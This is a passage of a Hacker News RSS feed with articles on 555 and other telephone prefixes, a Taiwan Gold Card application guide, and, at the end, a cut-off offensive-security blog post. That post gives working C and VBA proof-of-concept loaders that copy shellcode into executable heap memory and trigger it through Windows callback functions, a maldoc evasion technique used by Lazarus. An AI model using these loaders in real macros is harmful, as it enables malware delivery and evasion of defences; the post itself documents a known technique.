      </section>
    </div></div>]]>
            </description>
            <link>https://texdoc.org/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26211427</guid>
            <pubDate>Sun, 21 Feb 2021 06:51:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“555” and related telephone prefixes]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 10 (<a href="https://news.ycombinator.com/item?id=26211060">thread link</a>) | @miles
<br/>
February 20, 2021 | https://computer.rip/2021-02-20%20555%20500%20710%20etc.html | <a href="https://web.archive.org/web/*/https://computer.rip/2021-02-20%20555%20500%20710%20etc.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>We are probably all familiar with "555" telephone numbers. The basic idea is
that the 555 exchange code (or NXX in a NANP NXX-XXXX number) is reserved for
use in fiction. Of course, this isn't actually true at all, but that hasn't
stopped basically every work of fiction putting their imaginary telephone
numbers in the 555 exchange.</p>
<p>In reality, the 555 exchange has a somewhat bumpy history, as is the case with
most "special purpose" telephone ranges. Seemingly from the genesis of NANP as
a formal numbering standard, the 555 exchange was reserved for special use by
telcos, and was not to be used for normal subscriber lines. The 555 exchange
accumulated various and sundry uses, but most prominently, starting in the
early '60s it was used for directory service at 555-1212 in nearly all NPAs
(area codes). This was nearly the only successful use of the 555 exchange,
leaving it mostly empty.</p>
<p>Because the 555 exchange was conveniently largely out of use, it became common
for the entertainment industry to use 555 numbers in fiction. Wikipedia makes
the claim that the telephone industry had specifically recommended 555 numbers
for this use in the '60s, and while this is rather thinly sourced, it's not
hard to believe as any odd person in a technical role at a telephone company
might have suggested 555 as an exchange with extremely few assigned numbers.</p>
<p>In any case, the use of 555 numbers for fiction was somewhat informal. This
changed in 1994, when the telephone industry regretted leaving an entire
exchange out of use and formed a working group which allowed 555 numbers to
be assigned to nationwide communications services. The idea was that 555
numbers would have the unusual property of working nationwide when dialed as
only seven digits, somewhat like an early version of SMS short codes.</p>
<p>Because the use of 555 numbers in fiction was longstanding, the working group
explicitly reserved numbers starting 555-01 for use in fiction. This, in 1994,
is when this practice became formalized---but only for those 100 numbers.</p>
<p>In practice the 555 service as imagined was unsuccessful, and in the 2010s the
use was eliminated more or less by handshake agreement. Much like the pre-1994
state, the only valid phone numbers in the 555 exchange are 555-1212 for
directory assistance, and 555-4334. This latter number is apparently still
assigned for a nationwide use but no one specifies <em>what</em> use.</p>
<p>I did a bit of digging, and... came up empty. 555-4334 in a number of area
codes turns up nothing from the CNAM service I use. Similar attempts with
a couple of validation/carrier lookup vendors returned different types of
useless results. I haven't found any mention of the number in old newspapers,
with the interesting exception of some newspapers listing their classified
ads with exclusively 555 numbers, including 4334.</p>
<p>It was not an unusual practice at the time for newspapers to provide special
"voice mail box" numbers for classified ads, but to my knowledge the use of 555
was not typical.  The first newspapers to do so were almost all in Utah, which
hints that it may have originated as a choice by a local telco, potentially
Mountain Bell but maybe more likely an independent. I will do some more digging
into this over time. It's interesting in that it suggests a major use of 555
numbers which no document I've seen on the history of the exchange mentions.
This practice doesn't seem to have been eliminated until the 1994 reallocation.</p>
<p>I also learned that in 2009 you could get a rebate of $7,555 or $4,334 on a new
Dodge Nitro. Isn't OCR fun?</p>
<p>Finally, I located an older FCC report (dated 1997) that lists 555-4334 as
allocated to MCI mail, an early e-mail service. MCI mail access was initially
by modem, and so it's possible that 555-4334 was used as an access number,
although an 800 number was also provided for this purpose and 4334 is not
mentioned anywhere I can find as an access number. An interesting feature of
MCI Mail was its ability to forwarded email to postal addresses (by printing and
mailing it) or by fax or teletype, so I speculate that 555-4334 may have been
used as a return number for TTY messages, since the TTY integration was
apparently bidirectional. In any case, another document noted that 555-4334 was
permitted to remain in service until that service ended, which may have been an
allowance due to the fact that MCI was a telephone carrier (and thus had
greater sway over the working group) and that replacing the number may have
been technically difficult.</p>
<p>Today, it remains the case that only 555-01xx is properly allocated for
fictional use. However, the 555 exchange as a whole is as dead (or considering
the use by newspapers, much  more dead) than ever before, so it remains common
to use the entire 555 exchange in fiction.</p>
<p>Oddly, the 555 NPA (rather than exchange) is allocated for similar
applications, but as far as I can tell it is not in use.</p>
<p>The failure of the post-1994 use of 555 for a "short dialing service" reflects
a larger series of telco failures that has left some other special prefixes.
In the '90s, a great deal of attention was directed towards "non-geographic"
dialing. Because the telephone system connected the nation together, why not
have a method of telephone dialing which is independent of geography? Well, as
it turns out, there are several reasons, but this didn't stop anyone from
trying.</p>
<p>Although there were a hodgepodge of other attempts, the first major
non-geographic dialing scheme is contained in the special 700 NPA (area code).
This NPA was allocated as a direct result of the breakup of the Bell system for
use directly by interexchange (long-distance) carriers, since all existing
numbering ranges were allocated to the exchange (local) carriers. The primary
service offered in this range was "EasyReach 700" from AT&amp;T, which was
basically carrier-managed "follow-me."</p>
<p>Follow-me is a common feature of business telephone systems that allows a call
to a given number (extension or DID) to be directed to one or more real
extensions depending on the location of the intended recipient. For example, a
call to a professional might go to their desk or to an assistant depending on
whether they are in the office, while an auto mechanic might have a call to a
general contact number ring at the front desk or in the shop depending on where
they are.</p>
<p>EasyReach 700 moved this same concept from the PABX to the telephone network,
making it possible for follow-me to span the nation and making it accessible to
businesses without an (expensive) PABX. For example, a consumer with two
different homes could get a 700 number and set it to forward to whichever house
they were staying in, while a traveling salesman could set their 700 number
to forward to whichever hotel they were staying in.</p>
<p>EasyReach was a failure. There were several reasons, but the most significant
relates to the billing climate of the time. Today, unlimited long-distance is
so ubiquitous that the issue may not be obvious, or you might naively assume
that AT&amp;T had found a way to resolve the long distance cost issue. They did
not---in fact, they came up with something worse. The owner of a 700 number
could set it up to either bill forward (to the caller) or reverse (to the
callee). This meant that the caller of a 700 number had virtually no way to
determine whether the call would be free or charged at long-distance rate, and
this was a huge deterrent to use of these numbers.</p>
<p>Today, this and other uses of the 700 NPA have all died out, leaving 700
a nearly empty NPA. Like other empty NPAs, 700 is sometimes hijacked for
special uses by non-mainstream carriers and corporate phone systems. If my
hazy memory is correct, the 700 NPA was used by GE's interoffice leased-line
long distance network when I briefly worked for a GE business. Wikipedia
says that WalMart still uses it this way.</p>
<p>Since the 700 NPA was such a success, AT&amp;T naturally decided to do it again.
In 1993, NANP allocated the 500 NPA to Personal Communications Service (PCS),
not to be confused with Personal Communications Service (PCS). In fact, the
same term was allocated to two completely different purposes by two different
telecom organizations within a few years. The latter refers to a set of
services offered by a wireless network, e.g. Sprint PCS, while the former
refers to...  EasyReach 700 all over again, except for now it's called True
Connections.</p>
<p>True Connections failed for the exact same reasons as EasyReach 700, and was
officially eliminated in 2000, but by this point AT&amp;T had already largely
replaced it with a service using 800 numbers which were of course always
reverse billed...  which you and I might think is obviously what they should
have done in the first place, but back in the '90s toll-free and non-geographic
were viewed as being different animals. It seems to have taken AT&amp;T a long time
to catch on to the fact that the realities of long-distance billing required
that they be closely linked.</p>
<p>The concept of PCS (the non-geographic dialing one) did not die out with True
Connections, and additional NPAs were allocated to the same purpose,
generally in the format of 5 followed by the same digit twice, much like 800.
500 numbers continue to be non-geographic and the billing situation remains
odd, but that hasn't stopped the use of 500 for certain uses like modem banks
for ISPs and some calling cards. Very few 500 numbers remain in use today
despite the multiple allocated 500 codes, and due to the billing issues it's
common for outbound calls to 500 numbers to be blocked. Similar to 700, it's
not unusual for 500 to be used for internal purposes, although this is probably
less of a good idea since PCS services in the 500 NPA have not officially been
ended.</p>
<p>500 and related PCS area codes (500 has a surprising number of overlays
considering how obscure its usage is) also see use for other miscellaneous
telco applications. For example, the 588 area code, also assigned to PCS, was
(and may still be) …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://computer.rip/2021-02-20%20555%20500%20710%20etc.html">https://computer.rip/2021-02-20%20555%20500%20710%20etc.html</a></em></p>]]>
            </description>
            <link>https://computer.rip/2021-02-20%20555%20500%20710%20etc.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26211060</guid>
            <pubDate>Sun, 21 Feb 2021 05:27:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get a Taiwan Gold Card]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26210967">thread link</a>) | @harporoeder
<br/>
February 20, 2021 | https://notebook.wesleyac.com/taiwan-gold-card/ | <a href="https://web.archive.org/web/*/https://notebook.wesleyac.com/taiwan-gold-card/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section></section><section><p>The <a href="https://taiwangoldcard.com/">Taiwan Gold Card</a> is a combined visa, re-entry permit, open work permit and residence permit for Taiwan, valid for up to three years. It’s designed to bring skilled professionals into Taiwan, and if you’ve made more than ~$67k USD/year<label for="sn-1"></label><span>All of the prices are denominated in the law in New Taiwan Dollars, and have been converted into USD at October 2020 rates for this post. The threshold for eligibility is that you make more than $160,000 NTD/month.</span> at any point in the past three years you’re trivially eligible.<label for="sn-2"></label><span>There are also trickier ways to apply, such as proving your expertise in one of the eligible fields: Science and Technology, Economy, Education, Culture and Arts, Sports, Finance, Law, or Architecture. However, the bar for proving expertise is quite high (probably similar to an O-1 visa in the United States, depending on the category).</span> There is no lottery, anyone who is eligible can get approved within a couple months. If you’ve met the income requirement, it’s currently one of the easiest ways to get to Taiwan, and the visa it provides you allows you to enter Taiwan regardless of the COVID-19 situation in your country of origin. This post will explain the process for getting a Gold Card, including several tips that aren’t written down in any official documentation.</p><p>The most important tip is this: if you’re applying via your income, you should apply in the “Economy” category, <em>even if you think a different category describes your work better</em>. The other categories (especially Science and Technology) look for proof of income <strong>and</strong> proof of expertise, despite the law stating that only one is necessary. The Ministry of Economic Affairs, unlike the Ministry of Science and Technology, does things by the books and will approve you solely for the income requirement even if you are not an economist.<label for="sn-3"></label><span>As of February 2021, this may be changing — the Ministry of Economic Affairs appears to be rejecting people who work in fields not related to economics. The Ministry of Science and Technology says that they are now accepting people who work at any company related to science/technology and meet the salary requirement, but it’s too early to tell how strict they are about this.</span> Applying via income in a category other than “Economy” may cause your application to be rejected, and will likely incur a delay in processing your Gold Card request.<label for="sn-4"></label><span>If you’ve already applied in a category other than Economy, you have two options: You can either cancel your current application and submit a new one, paying the application fee a second time, or you can wait the month or two until your application is seen by the relevant ministry, and if it is rejected, change categories then by calling <a href="https://foreigntalentact.ndc.gov.tw/en/cp.aspx?n=D927ED39BDAE7478&amp;s=DA2F7BC919B77E24">Mr.&nbsp;Huang</a> and explaining the situation (which will not incur the extra fee).</span></p><p>In order to apply, you’ll need a picture of your passport with at least 6 months remaining on it before expiration, a copy of your W-2 or other document that shows your income<label for="sn-5"></label><span>Note that your paystubs are not a valid form of proof. If you don’t have a W-2 or similar tax document showing your full income (for instance, if you were only employed for part of the year), you may be able to get by with a document from your work stating what your income is, but I haven’t heard from anyone who’s done this. The guidelines specify a “月薪” which is translated as “monthly salary” — but this does not necessarily match the legal definition of salary as used in the US, which implies an employment relationship and a W-2. Things that are “月薪”: definitely W-2, possibly 1099-MISC. Things that are not 月薪: income reported on 1099-K, such as taking payment through card networks or being an Uber driver.</span>, a passport-style photo of yourself (a selfie taken in front of a white wall is fine), and a credit card or other method of payment to pay the couple hundred USD application fee.<label for="sn-6"></label><span>The application fees vary from ~$108 - $323 USD ($3,100 - $9,260 NTD) depending on your nationality, the duration of your Gold Card, and whether you apply from inside Taiwan or not. You can find how much the fee is for you in <a href="https://foreigntalentact.ndc.gov.tw/en/cp.aspx?n=AC68F9FBABA3F294&amp;s=4D07D9F9F687B542">this FAQ</a>. I paid $282 USD as an American applying for a 3-year Gold Card from outside of Taiwan.</span> Once you’ve got all that together, go to the <a href="https://coa.immigration.gov.tw/coa-frontend/four-in-one/entry/golden-card">application website</a>, click “I want to apply”, then “Self application”, and create an account. Then start a new Gold Card application and fill out the form. It’ll ask for your address in Taiwan, you can leave it blank if you don’t know where you’ll be staying (which you probably don’t, yet).<label for="sn-7"></label><span>Once you do have an address in Taiwan, you should go to the <abbr title="National Immigration Agency">NIA</abbr> within 30 days to get a new copy of your Gold Card with the address on it.</span> It’ll also ask if you want to apply in Taiwan or at a consulate/embassy overseas - you should probably pick whatever consulate you’re closest to, I went with the Taipei Economic and Cultural Office in San Francisco. You will also need to pick how long you want the card to be valid for, from 1-3 years. There is very little downside to picking a longer duration — it costs a trivial amount more, and is no harder to get.<label for="sn-8"></label><span>A possible reason to pick 2 years is if you want to reapply for a 3-year gold card in 2 years, using your current year’s salary — if, for instance, you expect to not be making enough for the salary cutoff once you move to Taiwan. I have no idea if this actually works (the Gold Card program is fairly new, so there aren’t many stories of people reapplying), but it’s worth considering, especially seeing as it could get you enough time to be able to apply for an <a href="https://www.immigration.gov.tw/5475/5478/141465/141808/152932/">APRC</a>.</span></p><p>Once you’ve submitted your application, you’ll need to wait a few weeks for it to be processed — it took mine 25 days, and I think anywhere from 3 weeks to a month is pretty normal. Either you’ll get a message asking you to provide additional documentation (unlikely, if you’re using a W-2 and submitted everything correctly), or you’ll get an email asking you to submit your passport to the application location that you’ve selected.</p><p>Once you get to the passport submission stage, it can be a bit unclear what to do — you can’t visit in person in most places due to COVID-19<label for="sn-9"></label><span>in the United States, at least.</span>, and the SF TECO at least does not answer phone calls or emails<label for="sn-10"></label><span>While the main SF TECO phone number goes unanswered, if you have Gold Card questions, you can call Angela at (415) 364-5632 and she should be able to help. The line is often busy, but if you leave a message she’ll get back to you.</span> (although other TECOs may be better, you should at least try calling your local TECO). What you need to do is pretty simple, however: just mail in the passport submission notice PDF that you can download on the application website (Download → Download Passport Submission Notice), your passport or a notarized copy of your passport, and a self-addressed USPS priority mail return envelope.</p><p>If like me, you don’t want to send in your physical passport, getting a notarized copy is pretty easy.<label for="sn-11"></label><span>In California, at least — laws vary by state, make sure to check your local laws.</span> Make a document with a copy of your passport<label for="sn-12"></label><span>I used a photo that I scaled so the passport was 1:1 with real life when printed, since I don’t have a scanner.</span> (just the first page and signature is fine, no need to include the stamp pages) and the statement “I, &lt;my name&gt;, affirm that the attached is a true and complete copy of the document which it purports to represent.” Then take that document to a notary and have them notarize your signature on it.</p><p>Once the TECO receives your envelope with the passport, you should get an email saying you’re approved, and only waiting on getting the physical Gold Card in the mail. If you need to fly to Taiwan before it arrives, you can print out a form that will allow you to board the plane on the application website, under “Download → Download Resident Authorization.” If you do this, you’ll need to pay a ~$18 USD ($500 NTD) fee to replace the card once you get to Taiwan. About 21 days after you get the email saying you’re approved<label for="sn-13"></label><span>I was told it would be at most 21 days, but it took 25 for me.</span> you should get a call from the TECO asking to schedule an appointment for you to pick up your Gold Card.<label for="sn-14"></label><span>They may say that this is an “interview,” but you’ve already been approved, so you shouldn’t worry too much about that. They asked me what I do for work, what connections I have in Taiwan, when I planned to go, and where I planned to stay.</span></p><p>Note that the start date (and thus the end date) of your Gold Card is determined by the day the passport is approved, so you may want to be a little strategic if you apply for a Gold Card significantly before you want to go to Taiwan — you can get all the way to the passport submission stage, then wait until a month or so before you plan to leave to actually submit your passport. Obviously there’s a tradeoff here — there’s some risk that your passport won’t be processed in time, but it may be worth considering, depending on your situation.</p><p>If you have any problems during this process, you can find a person to call for assistance on <a href="https://foreigntalentact.ndc.gov.tw/en/cp.aspx?n=D927ED39BDAE7478&amp;s=DA2F7BC919B77E24">this contact page</a>. Dialing Taiwan phone numbers from the United States can be tricky, but the thing that worked for me was dialing +886, then the area code with the leading zero omitted, then the rest of the number. Dialing 011 before the number or leaving on the zero in the area code would cause the call to fail for me, but your carrier may be different.</p><p>You might also want to check out the <a href="https://foreigntalentact.ndc.gov.tw/en/Content_List.aspx?n=6501F7D3D7CCA8A0">official website</a>, <a href="https://foreigntalentact.ndc.gov.tw/en/cp.aspx?n=AC68F9FBABA3F294&amp;s=4D07D9F9F687B542">official FAQ</a>, <a href="https://tw.forumosa.com/t/employment-gold-card-for-some-foreigners/159653">thread on the forumosa forum</a>, the <a href="https://taiwangoldcard.com/application-faq/">unofficial FAQ</a>, or <a href="http://blog.tomfifield.net/2018/05/how-to-apply-for-taiwans-immigration.html">Tom Fifield’s blog post</a>.</p><p>Enjoy Taiwan!</p><p><i>Thanks to Brandon Liu for providing additional information about valid sources of income.</i></p></section><section><p><a href="https://notebook.wesleyac.com/">☙</a></p></section></article></div>]]>
            </description>
            <link>https://notebook.wesleyac.com/taiwan-gold-card/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26210967</guid>
            <pubDate>Sun, 21 Feb 2021 05:07:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One thousand and one ways to copy your shellcode to memory (VBA Macros)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26210956">thread link</a>) | @todsacerdoti
<br/>
February 20, 2021 | https://adepts.of0x.cc/alternatives-copy-shellcode/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/alternatives-copy-shellcode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today’s homily is about how we can (ab)use different native Windows functions to copy our shellcode to a RWX section in our VBA Macros.</p>  <p><em>The topic is <strong>old</strong> and basic, but with the recent analysis of the Lazarus’ maldocs it feels like discussing this technique maybe can be handy at this moment.</em></p>  <p>As shown by NCC in his article “<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/">RIFT: Analysing a Lazarus Shellcode Execution Method</a>” Lazarus Group used maldocs where the shellcode is loaded and executed without calling any of the classical functions. To achieve it the VBA macro used <code>UuidFromStringA</code> to copy the shellcode to the RWX region and then triggered its execution via <code>lpLocaleEnumProc</code>. The <code>lpLocaleEnumProc</code> was previously documented by <a href="https://twitter.com/noottrak">@noottrak</a> in his article “<a href="http://ropgadget.com/posts/abusing_win_functions.html">Abusing native Windows functions for shellcode execution</a>”.</p> <p>Using alternatives ways to copy the shellcode is nothing new, even there are a few articles about discussing it for inter-process injections (<a href="https://www.hexacorn.com/blog/2019/05/18/inserting-data-into-other-processes-address-space/">Inserting data into other processes’ address space</a> by <a href="https://twitter.com/Hexacorn">@Hexacorn</a>, <a href="https://x-c3ll.github.io/posts/GetEnvironmentVariable-Process-Injection/">GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections</a> by <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> and <a href="https://adepts.of0x.cc/alternatives-copy-shellcode/Windows%20Process%20Injection:%20Command%20Line%20and%20Environment%20Variables">Windows Process Injection: Command Line and Environment Variables</a> by <a href="https://twitter.com/modexpblog">@modexpblog</a>, just to metion a few).</p> <p>Returning to <a href="https://twitter.com/noottrak">@nootrak</a>’s article we can find a list of different native functions which can be used to trigger the execution, and even a <a href="https://github.com/karttoon/trigen">tool</a> to build <em>maldocs</em> where the functions used to allocate, copy, and execute the shellcode are randomly chosen. Quoted from the article:</p> <p><em>I’m calling trigen (think 3 combo-generator) which randomly puts together a VBA macro using API calls from pools of functions for allocating memory (4 total), <strong>copying shellcode to memory (2 total)</strong>, and then finally abusing the Win32 function call to get code execution (48 total - I left SetWinEventHook out due to aforementioned need to chain functions). In total, there are 384 different possible macro combinations that it can spit out.</em></p> <p>The tool uses only 2 native functions to copy the shellcode, when there are dozens of them that can be used. So the number of possible combinations can grow A LOT.</p> <p>In an extremely abstract way we can label the functions that can be (ab)used in two labels: <strong>one-shot functions</strong> and <strong>two-shot functions</strong>. The first family of functions are those that let you copy the shellcode directly to the desired address (for example, <code>UuidFromStringA</code> used by Lazarus); meanwhile two-shot functions are those where the copy has to be done in two-steps: first copy the shellcode to <em>no man’s land</em>, and then retrieve it (for example, <code>SetEnvironmentVariable</code>/<code>GetEnvironmentVariable</code>)</p>  <p>Most of the functions falling into this category are functions used to convert info from format “A” to format “B”, or those applying any type of transformation to this info. This kind of functions can be spotted checking their arguments: if it receives an input buffer and an output buffer, it is a good candidate. Let’s check <code>LdapUTF8ToUnicode</code> for example:</p> <div><div><pre><code><span>WINLDAPAPI</span> <span>int</span> <span>LDAPAPI</span> <span>LdapUTF8ToUnicode</span><span>(</span>
  <span>LPCSTR</span> <span>lpSrcStr</span><span>,</span>
  <span>int</span>    <span>cchSrc</span><span>,</span>
  <span>LPWSTR</span> <span>lpDestStr</span><span>,</span>
  <span>int</span>    <span>cchDest</span>
<span>);</span>
</code></pre></div></div> <p>So, the parameters are:</p> <div><div><pre><code>lpSrcStr - A pointer to a null-terminated UTF-8 string to convert.
lpDestStr - A pointer to a buffer that receives the converted Unicode string, without a null terminator.
</code></pre></div></div> <p>This is a good candidate that meets our criteria. We can test it with a simple PoC in C:</p> <div><div><pre><code><span>#include &lt;Windows.h&gt;
#include &lt;Winldap.h&gt;
</span>
<span>#pragma comment(lib, "wldap32.lib")
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>**</span> <span>argv</span><span>)</span> <span>{</span>
	<span>LPCSTR</span> <span>orig_shellcode</span> <span>=</span> <span>"</span><span>\xec\xb3\x8c\xec\xb3\x8c</span><span>"</span><span>;</span> <span>// \xcc\xcc\xcc\xcc in UNICODE</span>
	<span>LPWSTR</span> <span>copied_shellcode</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>HANDLE</span> <span>heap</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>int</span> <span>ret</span> <span>=</span> <span>0</span><span>;</span>
	<span>int</span> <span>size</span> <span>=</span> <span>0</span><span>;</span>
	
	<span>heap</span> <span>=</span> <span>HeapCreate</span><span>(</span><span>HEAP_CREATE_ENABLE_EXECUTE</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>);</span>
	<span>copied_shellcode</span> <span>=</span> <span>HeapAlloc</span><span>(</span><span>heap</span><span>,</span> <span>0</span><span>,</span> <span>0x10</span><span>);</span>
	<span>size</span> <span>=</span> <span>LdapUTF8ToUnicode</span><span>(</span><span>orig_shellcode</span><span>,</span> <span>strlen</span><span>(</span><span>orig_shellcode</span><span>),</span> <span>NULL</span><span>,</span> <span>0</span><span>);</span> <span>// First call is to know the size</span>
	<span>ret</span> <span>=</span> <span>LdapUTF8ToUnicode</span><span>(</span><span>orig_shellcode</span><span>,</span> <span>strlen</span><span>(</span><span>orig_shellcode</span><span>),</span> <span>copied_shellcode</span><span>,</span> <span>size</span><span>);</span>
	<span>EnumSystemCodePagesW</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>0</span><span>);</span> <span>// Just to trigger the execution. Taken from Nootrak article.</span>
	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>As this function works doing a conversion from UTF-8 to UNICODE, we have to craft our shellcode (in this case just a bunch of int3) keeping this in mind.</p> <figure> <img src="https://adepts.of0x.cc/alternatives-copy-shellcode/ldaputf8tounicode-vscode.png" alt="Shellcode copied to our target RWX buffer"> <figcaption> Shellcode copied to our target RWX buffer. </figcaption> </figure> <p>As we saw, it worked. It is time to translate the C code to the impious language of <del>Mordor</del> VBA:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>HeapCreate</span> <span>Lib</span> <span>"KERNEL32"</span> <span>(</span><span>ByVal</span> <span>flOptions</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>dwInitialSize</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>dwMaximumSize</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>HeapAlloc</span> <span>Lib</span> <span>"KERNEL32"</span> <span>(</span><span>ByVal</span> <span>hHeap</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>dwFlags</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>dwBytes</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>EnumSystemCodePagesW</span> <span>Lib</span> <span>"KERNEL32"</span> <span>(</span><span>ByVal</span> <span>lpCodePageEnumProc</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>dwFlags</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>LdapUTF8ToUnicode</span> <span>Lib</span> <span>"WLDAP32"</span> <span>(</span><span>ByVal</span> <span>lpSrcStr</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>cchSrc</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpDestStr</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>cchDest</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>


<span>Sub</span> <span>poc</span><span>()</span>
    <span>Dim</span> <span>orig_shellcode</span><span>(</span><span>0</span> <span>To</span> <span>5</span><span>)</span> <span>As</span> <span>Byte</span>
    <span>Dim</span> <span>copied_shellcode</span> <span>As</span> <span>LongPtr</span>
    <span>Dim</span> <span>heap</span> <span>As</span> <span>LongPtr</span>
    <span>Dim</span> <span>size</span> <span>As</span> <span>Long</span>
    <span>Dim</span> <span>ret</span> <span>As</span> <span>Long</span>
    <span>Dim</span> <span>HEAP_CREATE_ENABLE_EXECUTE</span> <span>As</span> <span>Long</span>
    
    <span>HEAP_CREATE_ENABLE_EXECUTE</span> <span>=</span> <span>&amp;</span><span>H40000</span>
    
    <span>'\xec\xb3\x8c\xec\xb3\x8c ==&gt; \xcc\xcc\xcc\xcc</span>
    <span>orig_shellcode</span><span>(</span><span>0</span><span>)</span> <span>=</span> <span>&amp;</span><span>HEC</span>
    <span>orig_shellcode</span><span>(</span><span>1</span><span>)</span> <span>=</span> <span>&amp;</span><span>HB3</span>
    <span>orig_shellcode</span><span>(</span><span>2</span><span>)</span> <span>=</span> <span>&amp;</span><span>H8C</span>
    <span>orig_shellcode</span><span>(</span><span>3</span><span>)</span> <span>=</span> <span>&amp;</span><span>HEC</span>
    <span>orig_shellcode</span><span>(</span><span>4</span><span>)</span> <span>=</span> <span>&amp;</span><span>HB3</span>
    <span>orig_shellcode</span><span>(</span><span>5</span><span>)</span> <span>=</span> <span>&amp;</span><span>H8C</span>
    
    <span>heap</span> <span>=</span> <span>HeapCreate</span><span>(</span><span>HEAP_CREATE_ENABLE_EXECUTE</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>)</span>
    <span>copied_shellcode</span> <span>=</span> <span>HeapAlloc</span><span>(</span><span>heap</span><span>,</span> <span>0</span><span>,</span> <span>&amp;</span><span>H10</span><span>)</span>
    <span>size</span> <span>=</span> <span>LdapUTF8ToUnicode</span><span>(</span><span>VarPtr</span><span>(</span><span>orig_shellcode</span><span>(</span><span>0</span><span>)),</span> <span>6</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>)</span>
    <span>ret</span> <span>=</span> <span>LdapUTF8ToUnicode</span><span>(</span><span>VarPtr</span><span>(</span><span>orig_shellcode</span><span>(</span><span>0</span><span>)),</span> <span>6</span><span>,</span> <span>copied_shellcode</span><span>,</span> <span>size</span><span>)</span>
    <span>ret</span> <span>=</span> <span>EnumSystemCodePagesW</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>0</span><span>)</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Attach a debugger and run the macro!</p> <figure> <img src="https://adepts.of0x.cc/alternatives-copy-shellcode/vba-ldap-executed.png" alt="Macro executing our shellcode"> <figcaption> Macro executing our shellcode. </figcaption> </figure> <p>Another example can be <code>PathCanonicalize</code>:</p> <div><div><pre><code><span>BOOL</span> <span>PathCanonicalizeA</span><span>(</span>
  <span>LPSTR</span>  <span>pszBuf</span><span>,</span>
  <span>LPCSTR</span> <span>pszPath</span>
<span>);</span>
</code></pre></div></div> <p>The parameters meets our criteria:</p> <div><div><pre><code>pszBuf - A pointer to a string that receives the canonicalized path. You must set the size of this buffer to MAX_PATH to ensure that it is large enough to hold the returned string.

pszPath -  pointer to a null-terminated string of maximum length MAX_PATH that contains the path to be canonicalized.
</code></pre></div></div> <p>The PoC:</p> <div><div><pre><code><span>#include &lt;Windows.h&gt;
#include &lt;Shlwapi.h&gt;
</span>
<span>#pragma comment(lib, "Shlwapi.lib")
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>**</span> <span>argv</span><span>)</span> <span>{</span>
	<span>LPCSTR</span> <span>orig_shellcode</span> <span>=</span> <span>"</span><span>\xcc\xcc\xcc\xcc</span><span>"</span><span>;</span>
	<span>LPSTR</span> <span>copied_shellcode</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>HANDLE</span> <span>heap</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>BOOL</span> <span>ret</span> <span>=</span> <span>0</span><span>;</span>
	<span>int</span> <span>size</span> <span>=</span> <span>0</span><span>;</span>

	<span>heap</span> <span>=</span> <span>HeapCreate</span><span>(</span><span>HEAP_CREATE_ENABLE_EXECUTE</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>);</span>
	<span>copied_shellcode</span> <span>=</span> <span>HeapAlloc</span><span>(</span><span>heap</span><span>,</span> <span>0</span><span>,</span> <span>0x10</span><span>);</span>
	<span>PathCanonicalizeA</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>orig_shellcode</span><span>);</span>
	<span>EnumSystemCodePagesW</span><span>(</span><span>copied_shellcode</span><span>,</span> <span>0</span><span>);</span>
	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
